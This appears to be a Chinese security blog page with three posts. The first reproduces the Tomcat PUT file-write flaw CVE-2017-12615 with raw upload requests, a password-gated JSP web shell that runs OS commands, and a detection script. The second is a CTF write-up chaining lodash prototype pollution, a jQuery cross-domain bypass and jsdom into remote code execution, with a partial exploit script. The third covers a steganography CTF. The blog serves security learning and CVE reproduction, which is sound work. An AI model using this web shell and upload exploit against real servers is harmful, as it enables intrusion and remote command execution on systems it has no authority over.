        <h1 id="Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）"><a href="#Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）" class="headerlink" title="Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）"></a>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> Apache Tomcat 7.0.0 - 7.0.79 </p>
<p>平台: Windows </p>
<p> 启用了 HTTP PUT 请求方法  (conf/web.xml 中对于 DefaultServlet 的 readonly 设置为 false)</p>
<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>不能直接上传jsp结尾的文件</p>
<p>利用windows平台下:<code>sample.txt::$DATA</code>等价于<code>sample.txt</code>的特性来写shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PUT /111.jsp::$DATA HTTP/1.1</span><br><span class="line">Host: 10.1.1.6:8080</span><br><span class="line">User-Agent: JNTASS</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">...jsp shell...</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PUT /111.jsp/ HTTP/1.1</span><br><span class="line">Host: 10.1.1.6:8080</span><br><span class="line">User-Agent: JNTASS</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">...jsp shell...</span><br></pre></td></tr></table></figure>





<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;023&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;i&quot;</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>



<h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span>(<span class="params">url</span>):</span></span><br><span class="line">    filename=<span class="string">&quot;tomcat_check_vuln.txt&quot;</span></span><br><span class="line">    content=<span class="string">&quot;test&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.put(url+<span class="string">&quot;/&quot;</span>+filename,data=conetent)</span><br><span class="line">        res=requests.get(url+<span class="string">&quot;/&quot;</span>+filename)</span><br><span class="line">    <span class="keyword">except</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> res.status_code==<span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/" data-id="cku8j3fgw002sdan7c0q50ate" data-title="Tomcat PUT方法任意写文件漏洞CVE-2017-12615" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-XNUCA_2020_oooooooldjs题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/XNUCA_2020_oooooooldjs%E9%A2%98%E8%A7%A3/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.672Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/XNUCA_2020_oooooooldjs%E9%A2%98%E8%A7%A3/">XNUCA_2020_oooooooldjs题解</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="XNUCA-2020-oooooooldjs题解-md"><a href="#XNUCA-2020-oooooooldjs题解-md" class="headerlink" title="XNUCA_2020_oooooooldjs题解.md"></a>XNUCA_2020_oooooooldjs题解.md</h1><p>文章首发于<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/221388">安全客</a></p>
<p>题目描述</p>
<blockquote>
<p><code>npm audit</code> may miss something, be careful of the version of <code>lodash</code>. There is prototype pollution in <code>express-validator</code>, limited but powerful。</p>
</blockquote>
<p>npm audit发现lodash有原型链污染漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># Run  npm update lodash --depth 2  to resolve 1 vulnerability</span><br><span class="line">                                                              </span><br><span class="line">  Low             Prototype Pollution                         </span><br><span class="line">                                                              </span><br><span class="line">  Package         lodash                                      </span><br><span class="line">                                                              </span><br><span class="line">  Dependency of   express-validator                           </span><br><span class="line">                                                              </span><br><span class="line">  Path            express-validator &gt; lodash                  </span><br><span class="line">                                                              </span><br><span class="line">  More info       https://npmjs.com/advisories/1523      </span><br></pre></td></tr></table></figure>



<p>在<a target="_blank" rel="noopener" href="https://snyk.io/test/npm/express-validator/2.21.0%E4%B8%AD%E6%9F%A5%E7%9C%8Blodash%E4%B8%AD%E5%87%BA%E7%8E%B0%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E5%9C%B0%E6%96%B9%EF%BC%8C%E4%BE%9D%E6%AC%A1%E4%B8%8B%E6%96%AD%E7%82%B9">https://snyk.io/test/npm/express-validator/2.21.0中查看lodash中出现原型链污染的地方，依次下断点</a></p>
<p>传入json数据:<code>&#123;&quot;233&quot;:123&#125;</code>发现：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201031215650.png" alt="image1151"></p>
<p>调用了存在原型链污染的set方法，且[233]不为object的键值，在这里可以触发原型链污染</p>
<p>一波测试后得到原型链污染的payload:<code>&#123;&quot;.\&quot;].__proto__[\&quot;crossDomain&quot;:&#123;&quot;1&quot;:&quot;2&quot;&#125;&#125;</code>，但是不能控制原型链污染的值</p>
<p>审计题目代码发现，非常有意思的两个地方</p>
<ol>
<li><p>显眼的dangerous<br><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201031220029.png" alt="image1432"></p>
</li>
<li><p>这里自己实现了数据库的CURD四种方法</p>
</li>
</ol>
<p>学习了一波后发现第一点可以触发RCE</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; JSDOM &#125; = <span class="built_in">require</span>(<span class="string">&quot;jsdom&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> JSDOM(<span class="string">`</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">  &lt;script&gt;</span></span><br><span class="line"><span class="string">    const outerRealmFunctionConstructor = Node.constructor;</span></span><br><span class="line"><span class="string">    const process = new outerRealmFunctionConstructor(&quot;return process&quot;)();</span></span><br><span class="line"><span class="string">    const require = process.mainModule.require;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // Game over!</span></span><br><span class="line"><span class="string">    const fs = require(&#x27;fs&#x27;);</span></span><br><span class="line"><span class="string">    console.log(fs.readdirSync(&#x27;.&#x27;));</span></span><br><span class="line"><span class="string">  &lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">`</span>, &#123; </span><br><span class="line">  <span class="attr">runScripts</span>: <span class="string">&quot;dangerously&quot;</span> </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<p>在util.js中定义了唯一会用到jsdom的函数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;</span><br><span class="line">	JSDOM</span><br><span class="line">&#125; = <span class="built_in">require</span>(<span class="string">&quot;jsdom&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> &#123;</span><br><span class="line">	<span class="built_in">window</span></span><br><span class="line">&#125; = <span class="keyword">new</span> JSDOM(<span class="string">``</span>, &#123;</span><br><span class="line">	<span class="attr">url</span>: originUrl,</span><br><span class="line">	<span class="attr">runScripts</span>: <span class="string">&quot;dangerously&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// server side `$` XD</span></span><br><span class="line"><span class="keyword">const</span> $ = <span class="built_in">require</span>(<span class="string">&#x27;jquery&#x27;</span>)(<span class="built_in">window</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> requests = <span class="keyword">async</span> (url, method) =&gt; &#123;</span><br><span class="line">	<span class="keyword">let</span> result = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		result = <span class="keyword">await</span> $.ajax(&#123;</span><br><span class="line">			<span class="attr">url</span>: url,</span><br><span class="line">			<span class="attr">type</span>: method,</span><br><span class="line">		&#125;)</span><br><span class="line"></span><br><span class="line">		<span class="built_in">console</span>.log(result)</span><br><span class="line">	&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">		<span class="built_in">console</span>.log(err)</span><br><span class="line">		result = &#123;</span><br><span class="line">			<span class="attr">data</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> result.data</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>jquery的ajax有个特性是如果返回的content-type是text/javascript等代表着js脚本，那么便会执行js，结合上面的jsdom从而RCE，但是在低版本的话确实可以这么做，但是在高版本jquery进行了限制，如果是跨域请求便不会执行脚本</p>
<p>调试jquery代码发现：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201031220811.jpg" alt="image2617"></p>
<p>这里会覆盖我们的content-type，继续调试发现设置crossDomain的逻辑</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201031220938.png" alt="image2751"></p>
<p>如果s.crossDomain == null就会进入是否跨域的判断</p>
<p>利用前面的原型链污染从而绕过jquery的跨域限制</p>
<p>还剩下一个问题，我们如何传入自己的url</p>
<p>express开着一个中间件限制了我们url,而且也不让更新url类型的数据</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> middlewares = [</span><br><span class="line">	<span class="comment">// should be</span></span><br><span class="line">	body(<span class="string">&#x27;*&#x27;</span>).trim(),</span><br><span class="line">	body(<span class="string">&#x27;type&#x27;</span>).if(body(<span class="string">&#x27;type&#x27;</span>).exists()).bail().isIn([<span class="string">&#x27;url&#x27;</span>, <span class="string">&#x27;text&#x27;</span>])</span><br><span class="line">	.withMessage(<span class="string">&quot;type must be `url` or `text`&quot;</span>),</span><br><span class="line">	body(<span class="string">&#x27;block&#x27;</span>).if(body(<span class="string">&#x27;type&#x27;</span>).exists()).notEmpty()</span><br><span class="line">	.withMessage(<span class="string">&quot;no `block` content&quot;</span>).bail()</span><br><span class="line">	.if(body(<span class="string">&#x27;type&#x27;</span>).isIn([<span class="string">&#x27;url&#x27;</span>])).isURL(&#123;</span><br><span class="line">		<span class="attr">require_tld</span>: <span class="literal">false</span></span><br><span class="line">	&#125;)</span><br><span class="line">	.custom(<span class="function">(<span class="params">value, &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">		req</span></span></span><br><span class="line"><span class="params"><span class="function">	&#125;</span>) =&gt;</span> <span class="keyword">new</span> URL(value).host === host)</span><br><span class="line">	.withMessage(<span class="string">&quot;invalid url!&quot;</span>),</span><br><span class="line">	<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">		<span class="keyword">const</span> errors = validationResult(req)</span><br><span class="line">		<span class="keyword">if</span> (!errors.isEmpty()) &#123;</span><br><span class="line">			<span class="keyword">return</span> res.status(<span class="number">400</span>).json(&#123;</span><br><span class="line">				<span class="attr">errors</span>: errors.array()</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">		next()</span><br><span class="line">	&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<p>回到我们刚刚说的第二点有趣的地方，这个简单的数据库并不支持事务功能，也就是说删除type和data并不会同时删除是存在一定的时间差的，相关代码如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">D</span>(<span class="params">id</span>)</span> &#123;</span><br><span class="line">		<span class="keyword">let</span> di, dt</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">const</span> index <span class="keyword">in</span> <span class="built_in">this</span>.datas) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">this</span>.datas[index].id === id) &#123;</span><br><span class="line">				dt = <span class="built_in">this</span>.types[index]</span><br><span class="line">				<span class="built_in">this</span>.types.splice(index, <span class="number">1</span>)</span><br><span class="line">				di = index</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (dt === <span class="string">&#x27;url&#x27;</span>) &#123;</span><br><span class="line">			requests(<span class="built_in">this</span>.datas[di].block, <span class="string">&quot;DELETE&quot;</span>).finally(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">				<span class="built_in">this</span>.datas = <span class="built_in">this</span>.datas.filter(<span class="function">(<span class="params">value</span>)=&gt;</span>value.id !== id)</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">this</span>.datas = <span class="built_in">this</span>.datas.filter(<span class="function">(<span class="params">value</span>)=&gt;</span>value.id !== id)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<p>在删除了type后，他进行了一个相当耗时的操作：访问url，之后才删除data，又因为这里是一个链式删除，一个接着一个删除，所有type删除完后它可能才删除一个data</p>
<p>于是有：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">challenge = <span class="string">&quot;http://eci-2ze1whgyeh7v30y5j8yh.cloudeci1.ichunqiu.com:8888&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insertUrl</span>(<span class="params">url</span>):</span></span><br><span class="line">    burp0_url = challenge+<span class="string">&quot;/data&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;url&quot;</span>, <span class="string">&quot;block&quot;</span>: url&#125;</span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = requests.post(burp0_url, headers=burp0_headers, data=burp0_data).json()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insertData</span>(<span class="params">data</span>):</span></span><br><span class="line">    burp0_url = challenge+<span class="string">&quot;/data&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;text&quot;</span>, <span class="string">&quot;block&quot;</span>: data&#125;</span><br><span class="line">    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)</span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setLongLine</span>(<span class="params">length=<span class="number">2000</span></span>):</span></span><br><span class="line">    endId=<span class="string">&quot;&quot;</span></span><br><span class="line">    url = <span class="string">&quot;http://localhost:8888/data/fake-uuid&quot;</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> count &lt; length:</span><br><span class="line">        count+=<span class="number">1</span></span><br><span class="line">        data = insertUrl(url)</span><br><span class="line">        url = <span class="string">&quot;http://localhost:8888/data/&quot;</span>+data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;id&quot;</span>]</span><br><span class="line">        endId = data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;id&quot;</span>]</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/XNUCA_2020_oooooooldjs%E9%A2%98%E8%A7%A3/" data-id="cku8j3fgx002xdan709lrfbbz" data-title="XNUCA_2020_oooooooldjs题解" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-byb2019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/byb2019/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.672Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/byb2019/">百越杯2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="byb"><a href="#byb" class="headerlink" title="byb"></a>byb</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>cGxlYXNlIHN1Ym1pdDogZmxhZ3toZWxsb19ieWJ9</p>
<p>base64decode </p>
<p><code>please submit: flag&#123;hello_byb&#125;</code></p>
<h3 id="key"><a href="#key" class="headerlink" title="key"></a>key</h3><p>下载附件,用photoshop放大查看,有一条奇奇怪怪的钥匙</p>
<p>用hxd打开图片在图片末尾找到KEY:ISEEU!</p>
<p>提取钥匙中特殊颜色的RGB值与key循环异或</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">2f3f24</span><br><span class="line">222e13</span><br><span class="line">7f6624</span><br><span class="line">713645</span><br><span class="line">7b7e27</span><br><span class="line">723310</span><br><span class="line">646721</span><br><span class="line">76670c</span><br><span class="line">703723</span><br><span class="line">727816</span><br><span class="line">7a6020</span><br><span class="line">213345</span><br><span class="line">7b3277</span><br><span class="line">74375c</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rgb=[<span class="string">&#x27;2f&#x27;</span>,<span class="string">&#x27;3f&#x27;</span>,<span class="string">&#x27;24&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;2e&#x27;</span>,<span class="string">&#x27;13&#x27;</span>,<span class="string">&#x27;7f&#x27;</span>,<span class="string">&#x27;66&#x27;</span>,<span class="string">&#x27;24&#x27;</span>,<span class="string">&#x27;71&#x27;</span>,<span class="string">&#x27;36&#x27;</span>,<span class="string">&#x27;45&#x27;</span>,<span class="string">&#x27;7b&#x27;</span>,<span class="string">&#x27;7e&#x27;</span>,<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;72&#x27;</span>,<span class="string">&#x27;33&#x27;</span>,<span class="string">&#x27;10&#x27;</span>,<span class="string">&#x27;64&#x27;</span>,<span class="string">&#x27;67&#x27;</span>,<span class="string">&#x27;21&#x27;</span>,<span class="string">&#x27;76&#x27;</span>,<span class="string">&#x27;67&#x27;</span>,<span class="string">&#x27;0c&#x27;</span>,<span class="string">&#x27;70&#x27;</span>,<span class="string">&#x27;37&#x27;</span>,<span class="string">&#x27;23&#x27;</span>,<span class="string">&#x27;72&#x27;</span>,<span class="string">&#x27;78&#x27;</span>,<span class="string">&#x27;16&#x27;</span>,<span class="string">&#x27;7a&#x27;</span>,<span class="string">&#x27;60&#x27;</span>,<span class="string">&#x27;20&#x27;</span>,<span class="string">&#x27;21&#x27;</span>,<span class="string">&#x27;33&#x27;</span> ,<span class="string">&#x27;45&#x27;</span>,<span class="string">&#x27;7b&#x27;</span>,<span class="string">&#x27;32&#x27;</span>,<span class="string">&#x27;77&#x27;</span>,<span class="string">&#x27;74&#x27;</span>,<span class="string">&#x27;37&#x27;</span>,<span class="string">&#x27;5c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">key=<span class="string">&quot;ISEEU!&quot;</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rgb:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i,<span class="number">16</span>)^<span class="built_in">ord</span>(key[j])),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    j+=<span class="number">1</span></span><br><span class="line">    j%=<span class="number">6</span></span><br></pre></td></tr></table></figure>



<p>flag{265a4cd2-b7f1-4d32-9df7-733edfd2a21b}</p>
<h3 id="哈尔的移动城堡"><a href="#哈尔的移动城堡" class="headerlink" title="哈尔的移动城堡"></a>哈尔的移动城堡</h3><p>下载附件得到ori.jpg和102%</p>
<p>用hxd打开后发现</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t8ovhhnlj306f05nwf0.jpg" alt="image.png"></p>
<p>这是一张png图片但是文件头错了</p>
<p>划到最后面发现PK</p>
<p>图片里面又藏在压缩包,搜索IEND找到png的最后一个数据块(别问我为啥不用foremost,谁用谁知道)</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t8uu1b1yj30jy025jry.jpg" alt="image.png"></p>
